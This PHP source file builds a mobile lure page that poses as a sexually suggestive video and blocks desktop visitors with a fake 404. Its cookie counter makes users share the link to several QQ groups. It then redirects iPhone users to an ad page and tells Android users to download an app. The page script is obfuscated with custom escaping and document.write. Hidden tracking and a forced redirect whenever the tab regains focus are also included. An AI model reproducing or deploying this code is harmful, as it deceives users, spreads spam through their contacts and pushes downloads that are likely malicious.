<?php

if(!isMobile()){
    header('HTTP/1.1 404 not found');die();
}

$conf['title'] = base64_encode('姐夫你用些力檫深点我好痒啊.mp4');
$conf['img'] = base64_encode('http://kdweibo.com/microblog/filesvr/5b0d59d0ea3b4a7875d5dd69?original');
$conf['desc'] = base64_encode('51423人正在观看！！！');
$conf['url'] = base64_encode('http://share.weiyun.com/a2971b487570d46a50f0aff4bc247a12?_wv=3'.'&'.generate_password(rand(5,8)));
$conf['tongji'] = '<script type="text/javascript" src="https://js.users.51.la/19263361.js"></script>';

$urls = 'mqqapi://share/to_fri?file_type=news&src_type=web&version=1&generalpastboard=1&share_id=1101685683&url=' . $conf['url'] . '&previewimageUrl=' . $conf['img'] . '&image_url=' . $conf['img'] . '&title=' . $conf['title'] . '&description=' . $conf['desc'] . '&callback_type=scheme&thirdAppDisplayName=UVE=&app_name=UVE=&cflag=0&shareType=0';

session_start();

if (isset($_COOKIE['ci']) && $_COOKIE['ci'] > 0) {
	$ci = $_COOKIE['ci'];
}else{
	$ci = 0;
}
switch ($ci) {
 	case '0':
 		setcookie('ci',1);
 		$content = '\u5206\u4eab\u5230\u0051\u0051\u7fa4\u5373\u53ef\u89c2\u770b';
 		break;
 	case '1':
 		setcookie('ci',2);
 		$content = '\u221a\u5206\u4eab\u6210\u529f<br />\u518d\u5206\u4eab\u5230<b style=\'color:red\'>\u4e00\u4e2a</b>\u0051\u0051\u7fa4\u5373\u53ef\u89c2\u770b';
 		break;
 	case '2':
 		setcookie('ci',3);
 		$content = '\u221a\u5206\u4eab\u6210\u529f<br />\u8fd8\u9700\u5206\u4eab\u5230<b style=\'color:red\'>\u4e00\u4e2a\u4e0d\u540c\u0051\u0051\u7fa4</b>\u5373\u53ef\u89c2\u770b';
 		break;
 	case '3':
		setcookie('ci',3);
 		if(strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone')||strpos($_SERVER['HTTP_USER_AGENT'], 'iPad')){
		   header('Location:ad.php');die();
		}else if(strpos($_SERVER['HTTP_USER_AGENT'], 'Android')){
		     $content = '<b style=\'color:red\'>\u606d\u559c\u5206\u4eab\u5b8c\u6210\u002c\u7531\u4e8e\u0051\u0051\u7981\u9ec4\uff01\u9700\u4e0b\u8f7d\u0041\u0050\u0050\u514d\u8d39\u89c2\u770b\u767e\u4e07\u6fc0\u60c5\u89c6\u9891\u7528\u4e0d\u6389\u961f\uff01</b>';
		    $urls = 'tz.php';
		}
 		break;
 } 

function generate_password( $length = 8 ) { 
	$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; 
	$password = ''; 
	for ( $i = 0; $i < $length; $i++ ) { 
		$password .= $chars[ mt_rand(0, strlen($chars) - 1) ]; 
	} 
	return $password; 
}


function escape($string, $in_encoding = 'UTF-8',$out_encoding = 'UCS-2') { 
    $return = ''; 
    if (function_exists('mb_get_info')) { 
        for($x = 0; $x < mb_strlen ( $string, $in_encoding ); $x ++) { 
            $str = mb_substr ( $string, $x, 1, $in_encoding ); 
            if (strlen ( $str ) > 1) { // 多字节字符 
                $return .= '%u' . strtoupper ( bin2hex ( mb_convert_encoding ( $str, $out_encoding, $in_encoding ) ) ); 
            } else { 
                $return .= '%' . strtoupper ( bin2hex ( $str ) ); 
            } 
        } 
    } 
    return $return; 
}
function isMobile() { 
  // 如果有HTTP_X_WAP_PROFILE则一定是移动设备
  if (isset($_SERVER['HTTP_X_WAP_PROFILE'])) {
    return true;
  } 
  // 如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
  if (isset($_SERVER['HTTP_VIA'])) { 
    // 找不到为flase,否则为true
    return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
  } 
  // 脑残法，判断手机发送的客户端标志,兼容性有待提高。其中'MicroMessenger'是电脑微信
  if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $clientkeywords = array('nokia','sony','ericsson','mot','samsung','htc','sgh','lg','sharp','sie-','philips','panasonic','alcatel','lenovo','iphone','ipod','blackberry','meizu','android','netfront','symbian','ucweb','windowsce','palm','operamini','operamobi','openwave','nexusone','cldc','midp','wap','mobile','MicroMessenger'); 
    // 从HTTP_USER_AGENT中查找手机浏览器的关键字
    if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))) {
      return true;
    } 
  } 
  // 协议法，因为有可能不准确，放到最后判断
  if (isset ($_SERVER['HTTP_ACCEPT'])) { 
    // 如果只支持wml并且不支持html那一定是移动设备
    // 如果支持wml和html但是wml在html之前则是移动设备
    if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html')))) {
      return true;
    } 
  } 
  return false;
}

$all = '<script type="text/javascript">
var hiddenProperty = "hidden" in document ? "hidden" :
        "webkitHidden" in document ? "webkitHidden" :
            "mozHidden" in document ? "mozHidden" :
                null;

    var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, "visibilitychange");
$(document).ready(function () {
	layer.open({
		content:"<p align=center>'.$content.'</p>",
		shadeClose: false,
		btn:["\u786e\u5b9a"],
		yes:function(index){
			window.location.href="'.$urls.'";
			layer.close(index);
		}
	});
var onVisibilityChange = function () {
            if (!document[hiddenProperty]) window.location.href="'.$urls.'";
        }
document.addEventListener(visibilityChangeEvent, onVisibilityChange);
});
</script>
<style type="text/css">
.layermbox0 .layermchild{width: 88% !important;min-width:150px;max-width:88888px;}	
</style>';
$all = escape($all);

?>

<meta name="viewport" content="width=device-width">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<script type="text/javascript" src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script type="text/javascript" src="http://apps.bdimg.com/libs/layer.m/1.5/layer.m.js"></script>
<p><?php echo $all; ?></p>
<div style="display: none">
	<?php echo $conf['tongji']; ?>
</div>
<script type="text/javascript">
  var p = document.getElementsByTagName("p")[0];
  document.write(unescape(p.innerText));
  p.innerText = '';

</script>